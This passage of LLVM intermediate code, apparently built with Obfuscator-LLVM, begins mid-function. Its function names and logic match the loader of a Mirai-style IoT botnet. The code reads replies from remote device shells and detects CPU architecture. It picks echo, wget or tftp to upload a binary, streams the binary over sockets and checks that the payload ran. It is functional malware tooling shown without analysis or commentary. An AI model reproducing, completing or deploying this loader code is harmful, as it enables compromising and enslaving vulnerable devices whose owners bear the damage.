  %29 = bitcast i8* %28 to i32*
  store i32 7172705, i32* %29, align 1
  br label %64

; <label>:30:                                     ; preds = %25, %25
  %31 = load i8, i8* %16, align 1
  %32 = icmp eq i8 %31, 1
  %33 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  br i1 %32, label %34, label %35

; <label>:34:                                     ; preds = %30
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i64 0, i64 0), i64 5, i32 1, i1 false)
  br label %64

; <label>:35:                                     ; preds = %30
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i64 0, i64 0), i64 5, i32 1, i1 false)
  br label %64

; <label>:36:                                     ; preds = %25, %25, %25, %25
  %37 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  %38 = bitcast i8* %37 to i32*
  store i32 3553400, i32* %38, align 1
  br label %64

; <label>:39:                                     ; preds = %25, %25, %25
  %40 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  %41 = bitcast i8* %40 to i32*
  store i32 6516851, i32* %41, align 1
  br label %64

; <label>:42:                                     ; preds = %25, %25
  %43 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %43, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i64 0, i64 0), i64 5, i32 1, i1 false)
  br label %64

; <label>:44:                                     ; preds = %25, %25
  %45 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  %46 = bitcast i8* %45 to i32*
  store i32 6516848, i32* %46, align 1
  br label %64

; <label>:47:                                     ; preds = %25
  %48 = icmp eq i16 %26, 42
  %49 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2
  br i1 %48, label %50, label %52

; <label>:50:                                     ; preds = %47
  %51 = bitcast [6 x i8]* %49 to i32*
  store i32 3434611, i32* %51, align 1
  br label %64

; <label>:52:                                     ; preds = %47
  %53 = getelementptr inbounds [6 x i8], [6 x i8]* %49, i64 0, i64 0
  store i8 0, i8* %53, align 8
  tail call void @connection_close(%struct.connection* nonnull %0)
  br label %64

; <label>:54:                                     ; preds = %1
  %55 = tail call i32 @util_memsearch(i8* %5, i32 %8, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %56 = icmp eq i32 %55, -1
  br i1 %56, label %57, label %64

; <label>:57:                                     ; preds = %54
  %58 = icmp ugt i16 %7, 7168
  br i1 %58, label %59, label %64

; <label>:59:                                     ; preds = %57
  %60 = zext i16 %7 to i64
  %61 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 6144
  %62 = add nsw i64 %60, -6144
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %5, i8* %61, i64 %62, i32 1, i1 false)
  %63 = add i16 %7, -6144
  store i16 %63, i16* %6, align 8
  br label %64

; <label>:64:                                     ; preds = %35, %34, %39, %44, %52, %50, %42, %36, %27, %59, %57, %54, %12, %9
  %.0 = phi i32 [ 0, %9 ], [ 0, %12 ], [ %55, %54 ], [ 0, %57 ], [ 0, %59 ], [ 0, %27 ], [ 0, %36 ], [ 0, %42 ], [ 0, %50 ], [ 0, %52 ], [ 0, %44 ], [ 0, %39 ], [ 0, %34 ], [ 0, %35 ]
  ret i32 %.0
}

declare i32 @htons(...) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arm_subtype(%struct.connection* nocapture) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %16, label %8

; <label>:8:                                      ; preds = %1
  %9 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.30, i64 0, i64 0), i32 5)
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %8
  %12 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i64 0, i64 0), i32 5)
  %13 = icmp eq i32 %12, -1
  br i1 %13, label %16, label %14

; <label>:14:                                     ; preds = %11, %8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %15, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i64 0, i64 0), i64 5, i32 1, i1 false)
  br label %16

; <label>:16:                                     ; preds = %14, %11, %1
  %.0 = phi i32 [ 0, %1 ], [ %6, %11 ], [ %6, %14 ]
  ret i32 %.0
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @connection_consume_upload_methods(%struct.connection* nocapture) local_unnamed_addr #6 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %17, label %8

; <label>:8:                                      ; preds = %1
  %9 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.33, i64 0, i64 0), i32 22)
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %11, label %13

; <label>:11:                                     ; preds = %8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 6
  store i32 1, i32* %12, align 8
  br label %17

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.34, i64 0, i64 0), i32 22)
  %15 = icmp eq i32 %14, -1
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 6
  %.sink = select i1 %15, i32 2, i32 0
  store i32 %.sink, i32* %16, align 8
  br label %17

; <label>:17:                                     ; preds = %11, %13, %1
  %.0 = phi i32 [ 0, %1 ], [ %6, %13 ], [ %6, %11 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_echo(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %39, label %8

; <label>:8:                                      ; preds = %1
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 2
  %10 = load %struct.binary*, %struct.binary** %9, align 8
  %11 = icmp eq %struct.binary* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %8
  tail call void @connection_close(%struct.connection* nonnull %0)
  br label %39

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 5
  %15 = load i32, i32* %14, align 4
  %16 = getelementptr inbounds %struct.binary, %struct.binary* %10, i64 0, i32 1
  %17 = load i32, i32* %16, align 8
  %18 = icmp eq i32 %15, %17
  br i1 %18, label %39, label %19

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %21 = load i32, i32* %20, align 8
  %22 = getelementptr inbounds %struct.binary, %struct.binary* %10, i64 0, i32 2
  %23 = load i8**, i8*** %22, align 8
  %24 = sext i32 %15 to i64
  %25 = getelementptr inbounds i8*, i8** %23, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = icmp eq i32 %15, 0
  %28 = select i1 %27, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i64 0, i64 0)
  %29 = tail call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %21, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.35, i64 0, i64 0), i8* %26, i8* %28)
  %30 = load i32, i32* %14, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %14, align 4
  %32 = sext i32 %6 to i64
  %33 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %32
  %34 = load i16, i16* %3, align 8
  %35 = zext i16 %34 to i32
  %36 = sub nsw i32 %35, %6
  %37 = sext i32 %36 to i64
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %2, i8* %33, i64 %37, i32 1, i1 false)
  %38 = trunc i32 %36 to i16
  store i16 %38, i16* %3, align 8
  br label %39

; <label>:39:                                     ; preds = %13, %1, %19, %12
  %.0 = phi i32 [ 0, %12 ], [ 0, %19 ], [ 0, %1 ], [ %6, %13 ]
  ret i32 %.0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_upload_wget(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  %. = select i1 %7, i32 0, i32 %6
  ret i32 %.
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_upload_tftp(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %22, label %8

; <label>:8:                                      ; preds = %1
  %9 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.38, i64 0, i64 0), i32 17)
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %13, label %11

; <label>:11:                                     ; preds = %8
  %12 = sub nsw i32 0, %6
  br label %22

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i64 0, i64 0), i32 7)
  %15 = icmp eq i32 %14, -1
  br i1 %15, label %18, label %16

; <label>:16:                                     ; preds = %13
  %17 = sub nsw i32 0, %6
  br label %22

; <label>:18:                                     ; preds = %13
  %19 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i64 0, i64 0), i32 14)
  %20 = icmp eq i32 %19, -1
  %21 = sub nsw i32 0, %6
  %. = select i1 %20, i32 %6, i32 %21
  ret i32 %.

; <label>:22:                                     ; preds = %1, %16, %11
  %.0 = phi i32 [ %12, %11 ], [ %17, %16 ], [ 0, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_verify_payload(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.41, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %12, label %8

; <label>:8:                                      ; preds = %1
  %9 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.42, i64 0, i64 0), i32 14)
  %10 = icmp eq i32 %9, -1
  %11 = add nsw i32 %6, 255
  %. = select i1 %10, i32 %6, i32 %11
  ret i32 %.

; <label>:12:                                     ; preds = %1
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_cleanup(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  %. = select i1 %7, i32 0, i32 %6
  ret i32 %.
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #4 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #0 {
  %3 = alloca [4098 x i8], align 16
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = getelementptr inbounds [4098 x i8], [4098 x i8]* %3, i64 0, i64 0
  %8 = call i32 @vsnprintf(i8* nonnull %7, i64 4096, i8* %1, %struct.__va_list_tag* nonnull %5) #7
  call void @llvm.va_end(i8* nonnull %6)
  %9 = icmp sgt i32 %8, 0
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %2
  %11 = icmp slt i32 %8, 4096
  %. = select i1 %11, i32 %8, i32 4096
  %12 = sext i32 %. to i64
  %13 = call i64 @send(i32 %0, i8* nonnull %7, i64 %12, i32 16384) #7
  %14 = icmp eq i64 %13, %12
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10, %2
  br label %16

; <label>:16:                                     ; preds = %10, %15
  %.06 = phi i8 [ 1, %15 ], [ 0, %10 ]
  ret i8 %.06
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: nounwind
declare i32 @vsnprintf(i8* nocapture, i64, i8* nocapture readonly, %struct.__va_list_tag*) local_unnamed_addr #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

; Function Attrs: nounwind
declare i32 @puts(i8* nocapture readonly) #7

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { cold }
attributes #9 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
